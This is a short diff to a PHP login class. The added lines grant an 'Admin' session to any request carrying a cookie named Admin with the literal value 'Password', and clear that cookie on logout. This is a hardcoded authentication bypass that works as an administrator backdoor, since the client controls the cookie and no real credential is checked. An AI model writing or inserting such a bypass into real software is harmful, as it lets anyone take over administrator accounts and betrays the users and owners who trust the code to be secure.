@@ -47,7 +47,17 @@ public function isUserLoggedIn() {
     $this->logoutUser();
     $this->message = 'Bye bye!';
     unset($_SESSION['welcome']);
+    unset($_COOKIE['Admin']);
+    setcookie('Admin', '', time() - 3600, '/');
     return $logged;
+  }
+
+  if(isset($_COOKIE['Admin'])) {
+    if($_COOKIE['Admin'] == 'Password') {
+      $_SESSION['username'] = 'Admin';
+      $logged = true;
+      return $logged;
+    }
   }
 
   if(isset($_POST[self::$login])) {
